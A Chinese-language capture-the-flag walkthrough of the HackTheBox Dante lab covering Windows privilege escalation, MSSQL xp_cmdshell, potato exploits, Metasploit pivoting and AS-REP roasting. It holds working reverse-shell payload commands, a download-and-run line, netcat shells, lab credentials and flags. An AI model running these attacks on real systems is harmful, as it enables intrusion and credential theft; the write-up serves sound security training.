SYSTEM Shell
```

💥 **100% 提权**

---

### 三、正式提权操作（动手）
---

#### Step 7：准备 payload
##### 生成 payload
```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.71 LPORT=5467 -f exe -o IObit.exe 
```

##### 开监听
```plain
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.16.71
set LPORT 5467
run
```

##### 上传shell
```powershell
*Evil-WinRM* PS C:\Users\dharding\Documents> upload /home/kali/Desktop/htb/dante/IObit.exe
```

---

#### Step 8：修改服务执行命令（核心）
```powershell
sc.exe config IObitUnSvr binPath= "cmd.exe /c C:\Users\dharding\Documents\IObit.exe"
```

---

##### 命令逐字解释 🧠
| 部分 | 含义 |
| --- | --- |
| sc.exe config | 修改服务 |
| IObitUnSvr | 服务名 |
| binPath= | 启动时执行的命令 |
| cmd.exe /c | 执行一次命令 |


⚠️ **注意**

+ `binPath=` 后面**必须有空格**
+ 引号是给整个命令用的

---

#### Step 9：触发服务执行（SYSTEM 执行）
```powershell
sc.exe stop IObitUnSvr
sc.exe start IObitUnSvr
```

---

### 四、你必须吃透的知识点总结
---

#### 1️⃣ Windows 服务 ≠ 普通程序
服务 = **系统级任务**

| 项 | 说明 |
| --- | --- |
| LocalSystem | ≈ root |
| binPath | 实际执行的命令 |
| 服务启动 | 系统帮你执行 |


---

#### 2️⃣ 服务提权三大类型
##### ① Unquoted Service Path
+ 路径没引号
+ 中间目录可写

##### ② Service Binary Hijacking
+ exe 本身路径可写
+ 替换 IUService.exe

##### ③ Service Config Abuse（本题）
+ 你有 `ChangeConfig`
+ 直接改 binPath

👉 **本题是第 ③ 种**

---

#### 3️⃣ 一眼判断能不能提权（口诀）
**SYSTEM 服务 + ChangeConfig = 秒提权**

---

## 成功利用
```powershell
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.16.71
LHOST => 10.10.16.71
msf6 exploit(multi/handler) > set LPORT 5467
LPORT => 5467
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.71:5467 
[*] Sending stage (177734 bytes) to 10.10.110.3
[*] Meterpreter session 1 opened (10.10.16.71:5467 -> 10.10.110.3:27053) at 2026-02-01 03:54:28 +0800

meterpreter > 

C:\Users>type C:\Users\Administrator\Desktop\flag.txt
DANTE{Qu0t3_I_4M_secure!_unQu0t3}
```

# 172.16.1.5
> 还剩三个靶机明天打，今天先睡了（2026/2/1-03:58）
>

## 端口扫描
```c
root@DANTE-WEB-NIX01:~# export ip=172.16.1.5; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 21
Port open 111
Port open 135
Port open 139
Port open 445
Port open 1433
Port open 2049
Port open 5985
Port open 47001
Port open 49664
Port open 49665
Port open 49666
Port open 49667
Port open 49673
Port open 49678
Port open 49679
Port open 49680
```

## ftp匿名连接
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─#  proxychains -q ftp anonymous@172.16.1.5
Connected to 172.16.1.5.
220 Dante Staff Drop Box
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||58885|)
150 Opening data channel for directory listing of "/"
-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
226 Successfully transferred "/"
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||60751|)
150 Opening data channel for file download from server of "/flag.txt"
100% |**************|    44        0.16 KiB/s    00:00 ETA
226 Successfully transferred "/flag.txt"
44 bytes received in 00:00 (0.16 KiB/s)
ftp>
┌──(kali㉿kali)-[~/Desktop/htb/dante]
└─$ cat flag.txt 
DANTE{Ther3s_M0r3_to_pwn_so_k33p_searching!}
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─#  proxychains -q enum4linux -a 172.16.1.5
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Feb  1 10:17:12 2026

 =========================================( Target Information )=========================================

Target ........... 172.16.1.5                              
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.16.1.5 )=============================             
                                                           
                                                           
[E] Can't find workgroup/domain                            
                                                           
                                                           

 =================================( Nbtstat Information for 172.16.1.5 )=================================             
                                                           
Looking up status of 172.16.1.5                            
No reply from 172.16.1.5

 ====================================( Session Check on 172.16.1.5 )====================================              
                                                           
                                                           
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.                        
                                         
```

暂时没什么能打的了，看一看别的

## impacket-mssqlclient
我们在[172.16.2.6](#atp3d)服务器翻查到了数据库配置文件

```c
Julian，您好，

我把这个放在了您的个人桌面上，因为这可能是网络上最安全的地方！
您能否请 Sophie 在下次登录时更改她的 SQL 密码？我已经把它重置为 TerrorInflictPurpleDirt996655，但显然这个密码比较难记。
也许我们大家都应该使用密码管理器？
谢谢，
James
```

得到了Sophie/TerrorInflictPurpleDirt996655

尝试连接

```c
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# proxychains -q impacket-mssqlclient Sophie:TerrorInflictPurpleDirt996655@172.16.1.5
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DANTE-SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (sophie  dbo@master)>

```

## xp_cmdshell
```c
SQL (sophie  dbo@master)> SELECT IS_SRVROLEMEMBER ('sysadmin');//判断是否为管理员
-   
1   

SQL (sophie  dbo@master)> exec xp_cmdshell 'cmd /c whoami'
output                        
---------------------------   
nt service\mssql$sqlexpress   
NULL                          
SQL (sophie  dbo@master)>

//由于环境中不存在curl 我们用powershell的invoke-webrequest下载文件
exec xp_cmdshell 'powershell invoke-webrequest http://10.10.16.80/shell.exe -outfile C:\Users\public\shell.exe'
exec xp_cmdshell 'cmd /c C:\Users\public\shell.exe'
```

## msfshell
```c
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.16.80:7797 
[*] Sending stage (177734 bytes) to 10.10.110.3
[*] Meterpreter session 2 opened (10.10.16.80:7797 -> 10.10.110.3:51827) at 2026-02-01 20:19:56 +0800

meterpreter >shell
C:\Users>type flag.txt
type flag.txt
DANTE{Mult1ple_w4Ys_in!}
```

## 凭据检索
```c
c:\DB_backups>type db_backup.ps1
type db_backup.ps1
# Work in progress database backup script. Adapting from mysql backup script. Does not work yet. Do not use.

$password = 'Alltheleavesarebrown1'
$user = 'sophie'
$cred = New-Object System.Net.NetworkCredential($user, $password, "")
```

我们将使用这些凭据连接到 WinRM：

```c
proxychains -q evil-winrm -i 172.16.1.5 -u sophie -p Alltheleavesarebrown1
```

## 提权
### 权限检索
```c
*Evil-WinRM* PS C:\Users\sophie\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeAssignPrimaryTokenPrivilege Replace a process level token  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

可以发现我们拥有 **SeAssignPrimaryTokenPrivilege 权限 **

我们使用的是 Windows Server 2016

### 土豆提权
```c
1.上传nc
*Evil-WinRM* PS C:\Users\sophie\Documents> upload ./netcat/nc.exe nc.exe              
Info: Uploading /home/kali/Desktop/tools/netcat/nc.exe to C:\Users\sophie\Documents\nc.exe                                                                                                  
Data: 60360 bytes of 60360 bytes copied                                      
Info: Upload successful!

2.上传土豆
*Evil-WinRM* PS C:\Users\sophie\Documents> upload ./PotatoFamily/SharpEfsPotato/SharpEfsPotato.exe SharpEfsPotato.exe                                  
Info: Uploading /home/kali/Desktop/tools/PotatoFamily/SharpEfsPotato/SharpEfsPotato.exe to C:\Users\sophie\Documents\SharpEfsPotato.exe                                  
Data: 86696 bytes of 86696 bytes copied                                        
Info: Upload successful!

3.SharpEfs土豆提权
.\SharpEfsPotato.exe -p C:\Users\sophie\Documents\nc.exe -a "10.10.16.80 9999 -e cmd.exe"

4.Juicy土豆提权
.\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c c:\users\sophie\documents\nc.exe -e cmd.exe 10.10.16.80 9999" -l 63636 -c "{4991d34b-80a1-4291-83b6-3328366b9097})"

-c的参数需要获取此版本的有效 CLSID，任何应用程序都可以，只要它是针对正确的构建版本， http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/
这里我使用了github的readme默认值https://github.com/ohpe/juicy-potato -c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# nc -lnvp 9999
listening on [any] 9999 ...
connect to [10.10.16.80] from (UNKNOWN) [10.10.110.3] 59394
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
DANTE{Ju1cy_pot4t03s_in_th3_wild}

```



## evil-winrm
# 172.16.2.5-DC02
## Msf-DC01
```c
C:\Users>for /L %i in (1,1,255) do @ping -n 1 -w 200 172.16.2.%i | find "TTL="
Reply from 172.16.2.5: bytes=32 time=1ms TTL=127
```

通过DC01成功探测到172.16.2.5

这里通过msf进行扫描端口，但是我们打dc01的时候不要开proxychains，而是直接

```c
msf6 exploit(windows/smb/ms17_010_psexec) > set Proxies socks5:127.0.0.1:1234
Proxies => socks5:127.0.0.1:1234
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# msfconsole                                     
Metasploit tip: Search can apply complex filters such as search cve:2009 
type:exploit, see all the filters with help search
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,                               
                      .                                 

       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1678 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > set Proxies socks5:127.0.0.1:1234
Proxies => socks5:127.0.0.1:1234
msf6 exploit(windows/smb/ms17_010_psexec) > set ReverseAllowProxy true
ReverseAllowProxy => true
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 172.16.1.20
RHOSTS => 172.16.1.20
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST 10.10.16.71
LHOST => 10.10.16.71
msf6 exploit(windows/smb/ms17_010_psexec) > set LPORT 5444
LPORT => 5444
msf6 exploit(windows/smb/ms17_010_psexec) > run
meterpreter > 
```

## 端口扫描
```c
meterpreter > run autoroute -s 172.16.2.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.2.0/255.255.255.0...
[+] Added route to 172.16.2.0/255.255.255.0 via 10.10.110.3
[*] Use the -p option to list all active routes

meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_psexec) >  use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 172.16.2.5
RHOSTS => 172.16.2.5
msf6 auxiliary(scanner/portscan/tcp) > set THREADS 10
THREADS => 10
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 172.16.2.5            - 172.16.2.5:53 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:88 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:135 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:139 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:389 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:445 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:464 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:593 - TCP OPEN
[+] 172.16.2.5            - 172.16.2.5:636 - TCP OPEN
...
[+] 172.16.2.5:           - 172.16.2.5:5985 - TCP OPEN
```

## 端口转发
### 原理
 Metasploit「支持」动态端口转发，但只到 SOCKS（L4），不是真正的二层 / 全协议透明转发。  

#### MSF 的 SOCKS 本质是：
| 层级 | 能力 |
| --- | --- |
| L3 / L4 | ✅ |
| TCP | ✅ |
| UDP | ❌（极不完整） |
| ARP / 广播 | ❌ |
| Kerberos 票据交互 | ❌ |
| SMB 命名管道复杂行为 | ❌ |


所以它**只能做到**：

“**让支持 SOCKS 的工具，间接访问内网 IP**”

而不是：

“**让你的 Kali 像真的插在 172.16.2.0 里一样**”

#### 这些东西对 SOCKS 极不友好
+ Kerberos（88 / UDP+TCP）
+ LDAP SASL
+ SMB（445 多阶段）
+ Windows RPC
+ BloodHound（Neo4j + LDAP + Kerberos）

##### ❌ 1️⃣ Kerberos —— 88 / TCP + UDP（重灾区）
**问题点：**

+ UDP 是主路径（AS-REQ / TGS-REQ）
+ TCP 只是 fallback
+ 会嵌入真实 IP
+ 多次往返 + 时钟依赖

**结果：**

+ `kinit`
+ `GetUserSPNs.py`
+ `secretsdump`（Kerberos 模式）

👉 **SOCKS 基本不稳定 / 直接失败**

---

##### ❌ 2️⃣ DNS —— 53 / UDP（TCP 也不靠谱）
**问题点：**

+ UDP 为主
+ TCP 仅用于 zone transfer / 大响应
+ 工具默认 UDP

**结果：**

+ 域发现
+ DC 定位
+ `_ldap._tcp.dc._msdcs`

👉 SOCKS 下**要么查不到，要么极慢**

---

##### ❌ 3️⃣ NetBIOS / 浏览器广播
| 端口 | 协议 |
| --- | --- |
| 137 | UDP |
| 138 | UDP |
| 139 | TCP + 广播依赖 |


**问题点：**

+ 广播（255.255.255.255）
+ L2 / L3 混合

👉 SOCKS **完全不支持广播**

---

##### ❌ 4️⃣ LDAP + SASL / GSSAPI —— 389 / 636
**注意：**

+ **裸 LDAP（简单 bind）有时能跑**
+ **一旦用 Kerberos / GSSAPI 就炸**

**失败表现：**

+ `ldap_sasl_interactive_bind_s failed`
+ BloodHound 卡住
+ Impacket 报奇怪错误

---

##### ❌ 5️⃣ SMB 高级用法 —— 445
**不是“不能连”，而是：**

| 功能 | SOCKS |
| --- | --- |
| 简单枚举 | ⚠️ |
| 列共享 | ⚠️ |
| 执行 | ❌ |
| 管道 / 服务 | ❌ |
| EternalBlue | ❌ |


**原因：**

+ 多阶段连接
+ 命名管道
+ 回连
+ 协议内嵌地址

---

##### ❌ 6️⃣ RPC / DCOM —— 135 + 随机高端口
**致命点：**

+ 135 只是 mapper
+ 后续会跳到 **随机端口**
+ SOCKS 无法预期转发

👉 **DCOM / WMI 基本别想**

---

##### ❌ 7️⃣ WinRM（部分场景）—— 5985 / 5986
+ HTTP 本身能走 SOCKS
+ 但 **认证阶段 + NTLM / Kerberos** 经常失败

### 指令
```c
meterpreter > portfwd add -L 127.0.0.1 -l 53 -p 53 -r 172.16.2.5
meterpreter > portfwd add -L 127.0.0.1 -l 88 -p 88 -r 172.16.2.5
```

## Kerbrute（失败）
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/kerbrute]
└─# ./kerbrute userenum -d DANTE --dc 127.0.0.1 /home/kali/Desktop/htb/dante/excel_users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/01/26 - Ronnie Flathers @ropnop

2026/02/01 11:45:18 >  Using KDC(s):
2026/02/01 11:45:18 >   127.0.0.1:88

2026/02/01 11:45:28 >  Done! Tested 19 usernames (0 valid) in 10.002 seconds
                                                           
```

我这里没有成功是因为枚举用户的时候必须是  username@domain

```c
sed -i 's/.*/&@dante/' excel_users.txt
```

可是也没成功

## 重新配置
#### 1️⃣ 使用 autoroute（不是 portfwd）
portfwd 只适合单端口  
**扫描 / Kerberos / LDAP / SMB 必须用 autoroute + socks**

```plain
meterpreter > run autoroute -s 172.16.2.0/24
```

确认路由：

```plain
msf6 > route print
```

期望结果：

```plain
172.16.1.0/24 via Session 1
172.16.2.0/24 via Session 1
```

---

### 启动 SOCKS 代理（唯一入口）
#### 2️⃣ 启动 Metasploit SOCKS5
```plain
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > run
```

确认监听：

```plain
ss -lntp | grep 1080
```

---

### 配置 proxychains（90% 卡点都在这）
#### 3️⃣ proxychains 正确配置
```plain
dynamic_chain
proxy_dns

[ProxyList]
socks5 127.0.0.1 1080
```

❌ **不要**：

+ strict_chain + 死代理
+ 多个 socks 级联
+ portfwd + socks 混用

---

### 验证 pivot 是否真正成功（关键一步）
#### 4️⃣ 用 CME 验证（比 nmap 更准）
```plain
proxychains crackmapexec smb 172.16.2.5
SMB         172.16.2.5      445    DANTE-DC02       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANTE-DC02) (domain:DANTE.ADMIN) (signing:True) (SMBv1:False)
```

domain:DANTE.ADMIN

确定了域

## GetNPUsers.py
```plain
cp -r ftp_users.txt  NPUser.txt

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# sed -i 's/.*/&@DANTE.ADMIN/' NPUser.txt 
                                                           
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# cat NPUser.txt 
asmith@DANTE.ADMIN
smoggat@DANTE.ADMIN
tmodle@DANTE.ADMIN
ccraven@DANTE.ADMIN
kploty@DANTE.ADMIN
jbercov@DANTE.ADMIN
whaguey@DANTE.ADMIN
dcamtan@DANTE.ADMIN
tspadly@DANTE.ADMIN
ematlis@DANTE.ADMIN
fglacdon@DANTE.ADMIN
tmentrso@DANTE.ADMIN
dharding@DANTE.ADMIN
smillar@DANTE.ADMIN
bjohnston@DANTE.ADMIN
iahmed@DANTE.ADMIN
plongbottom@DANTE.ADMIN
jcarrot@DANTE.ADMIN
lgesley@DANTE.ADMIN
```

格式是根据crackmapexec smb 172.16.2.5得到的domain:DANTE.ADMIN

```plain
proxychains -q impacket-GetNPUsers DANTE.ADMIN/ -no-pass -dc-ip 172.16.2.5 -usersfile /home/kali/Desktop/htb/dante/NPUser.txt
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# proxychains -q impacket-GetNPUsers DANTE.ADMIN/ -no-pass -dc-ip 172.16.2.5 -usersfile /home/kali/Desktop/htb/dante/NPUser.txt
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$jbercov@DANTE.ADMIN@DANTE.ADMIN:90dfece98fe97604a661e7e322a924eb$afbccc3f282efd60ba51aa8252451527935948d7e4d8476d3e65a56f0ce17b5d68eba5c506ba2ffa7c0d7152444964464173097c3696fa3f4335d5527b6ce51adde2e34ca31543aa3ea53a1e12145e75e520767c13945289d8c0dd8e539aa8420caa6267d3efbf84fc26ec112104153940a7f423d22fc7ecb288245ea68fe99c18aa891174c64f9732f182bf5f3b69891c00d9d04f656041e481550e8953c68cc978c22ad613ab8c8c41bb12d7668cfb4970baac3959f81be76f270991908dde74f4f61874bab2ae06b4e080d64a52b513ee52bae10902e825b0937e1e27d975278123288373293c7773
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

```plain
[*] Getting TGT for jbercov
$krb5asrep$23$jbercov@DANTE:b9caeb0c0c445bd656d0f1b95284ccc8$a7d2bcf7e16f9f971b0fd9a03e3bb10316016b8a63f732ba85985eb1c4d23ca22ad49946e78b0b673f9edb1dc40dc6bb268aeb05860f4289d98d48b44f211a61a01a3491c059f3233356a516a590869dd4651874b589c02b96036e1c4a6ee863e9e58bd27001537850a5f2f1dbde8e60cf9a01d451b17aef2cec88a90af1a75dea0dd1af3ca3fe75efd060f3caaa8920ccaf31c4b7cda544852effe9909e62fb585803bafebdc55413502a1e50e6beb79c9a414887a5beb60eb5a3bd2f12cd05ac8df4d1b50731e01ef76b559d84bc905a1d51f522492be0ac35177931057c7118a5de21
```

## TGT明文爆破
```plain
echo '$krb5asrep$23$jbercov@DANTE:b9caeb0c0c445bd656d0f1b95284ccc8$a7d2bcf7e16f9f971b0fd9a03e3bb10316016b8a63f732ba85985eb1c4d23ca22ad49946e78b0b673f9edb1dc40dc6bb268aeb05860f4289d98d48b44f211a61a01a3491c059f3233356a516a590869dd4651874b589c02b96036e1c4a6ee863e9e58bd27001537850a5f2f1dbde8e60cf9a01d451b17aef2cec88a90af1a75dea0dd1af3ca3fe75efd060f3caaa8920ccaf31c4b7cda544852effe9909e62fb585803bafebdc55413502a1e50e6beb79c9a414887a5beb60eb5a3bd2f12cd05ac8df4d1b50731e01ef76b559d84bc905a1d51f522492be0ac35177931057c7118a5de21' > tgt-hash
```

要记得用单引号

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# hashcat -m 18200 tgt-hash /usr/share/wordlists/rockyou.txt   
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2899/5862 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

INFO: All hashes found as potfile and/or empty entries! Use --show to display them.

Started: Sun Feb  1 12:57:52 2026
Stopped: Sun Feb  1 12:57:53 2026
                                                           
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/dante]
└─# hashcat -m 18200 tgt-hash --show

$krb5asrep$23$jbercov@DANTE:b9caeb0c0c445bd656d0f1b95284ccc8$a7d2bcf7e16f9f971b0fd9a03e3bb10316016b8a63f732ba85985eb1c4d23ca22ad49946e78b0b673f9edb1dc40dc6bb268aeb05860f4289d98d48b44f211a61a01a3491c059f3233356a516a590869dd4651874b589c02b96036e1c4a6ee863e9e58bd27001537850a5f2f1dbde8e60cf9a01d451b17aef2cec88a90af1a75dea0dd1af3ca3fe75efd060f3caaa8920ccaf31c4b7cda544852effe9909e62fb585803bafebdc55413502a1e50e6beb79c9a414887a5beb60eb5a3bd2f12cd05ac8df4d1b50731e01ef76b559d84bc905a1d51f522492be0ac35177931057c7118a5de21:myspace7
```

我们拿到了凭据jbercov/myspace7

## evil-winrm（失败）
```plain
proxychains -q evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
```

成功进去一次

执行个上传命令就卡死了

## 提权（失败）
### 上传sharphound
```plain
┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# sharphound                                      

> sharphound ~ C# Data Collector for BloodHound

/usr/share/sharphound
├── SharpHound.exe
├── SharpHound.exe.config
├── SharpHound.pdb
└── SharpHound.ps1
                      

┌──(web)─(root㉿kali)-[/usr/share/sharphound]
└─# proxychains -q evil-winrm -i 172.16.2.5 -u jbercov -p myspace7
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jbercov\Documents>
upload /usr/share/sharphound/SharpHound.exe C:\Windows\Temp\SharpHound.exe
upload /usr/share/sharphound/SharpHound.ps1 C:\Windows\Temp\SharpHound.ps1
```

没成功，因为我们设置了代理

利用msf上传

```plain
meterpreter > upload /usr/share/sharphound/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe
[*] Uploading  : /usr/share/sharphound/SharpHound.exe -> C:\Windows\Temp\SharpHound.exe
[*] Uploaded 1.26 MiB of 1.26 MiB (100.0%): /usr/share/sharphound/SharpHound.exe -> C:\Windows\Temp\SharpHound.exe
[*] Completed  : /usr/share/sharphound/SharpHound.exe -> C:\Windows\Temp\SharpHound.exe

meterpreter > upload /usr/share/sharphound/SharpHound.ps1 C:\\Windows\\Temp\\SharpHound.ps1
[*] Uploading  : /usr/share/sharphound/SharpHound.ps1 -> C:\Windows\Temp\SharpHound.ps1
[*] Uploaded 1.54 MiB of 1.54 MiB (100.0%): /usr/share/sharphound/SharpHound.ps1 -> C:\Windows\Temp\SharpHound.ps1
[*] Completed  : /usr/share/sharphound/SharpHound.ps1 -> C:\Windows\Temp\SharpHound.ps1
meterpreter >
```

### 运行sharphound.exe
 切到 cmd / powershell 运行 chisel  

```plain
meterpreter > shell
Process 1932 created.
Channel 4 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Windows\Temp
C:\Windows\Temp>
```

```plain
# 使用默认参数采集所有数据
SharpHound.exe -c All
C:\Windows\Temp>.\SharpHound.exe -c All
.\SharpHound.exe -c All

Unhandled Exception: System.MissingMethodException: Method not found: '!!0[] System.Array.Empty()'.
   at Sharphound.Program.<Main>d__0.MoveNext()
   at System.Runtime.CompilerServices.AsyncMethodBuilderCore.Start[TStateMachine](TStateMachine& stateMachine)
   at Sharphound.Program.<Main>(String[] args)
版本不兼容


```

### 运行sharphound.ps1
```plain
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS >

# 导入 PowerShell 脚本
powershell -NoLogo -NoProfile -ExecutionPolicy Bypass

Import-Module .\SharpHound.ps1

# 执行收集
Invoke-BloodHound -CollectionMethod All -Domain DANTE.LOCAL -ZipFileName data.zip
```

.Net版本不兼容，换一个bloodhound的版本

### 上传旧版本bloodhound
```plain
upload /home/kali/Desktop/tools/sharphound/SharpHound-v2.3.4/SharpHound.ps1 C:\\Windows\\Temp\\SharpHound_old.ps1
```

### 运行旧版本bllodhound
```plain
cd C:\Windows\Temp
